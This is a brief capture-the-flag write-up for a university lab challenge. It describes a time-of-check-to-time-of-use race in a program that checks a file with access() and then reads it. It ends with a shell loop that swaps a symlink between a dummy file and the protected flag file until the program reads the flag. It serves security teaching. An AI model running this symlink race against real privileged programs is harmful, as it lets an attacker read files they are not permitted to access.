# Challenge `I challenge you for a race` writeup

- Vulnerability: What type of vulnerability is being exploited
  - Vulnerable to TOCTOU

- Where: Where is the vulnerability present
  - `username@mustard.stt.rnl.tecnico.ulisboa.pt`, on port `23651`

- Impact: What results of exploiting this vulnerability
  - Allows the user to read files without permission, by exploiting the `access` function in the provided code

## Steps to reproduce

1. SSH to username@mustard.stt.rnl.tecnico.ulisboa.pt`, on port `23651`
2. Create a folder with `mkdir /tmp/<name>`
3. Create a dummy file inside this folder and a pointer for it
4. Execute the program `challenge` in the folder `/challenge` and give the pointer as input
5. Quickly change the pointer to the flag located in `/challenge/flag`

The code used was the following:

```sh
  while true; do
    touch /tmp/joaomatos/dummy
    ln -sf /tmp/joaomatos/dummy /tmp/joaomatos/pointer
    echo "/tmp/joaomatos/pointer" | /challenge/challenge &
    ln -sf /challenge/flag /tmp/joaomatos/pointer
done
```

Note: `grep` was used to extract the flag from the output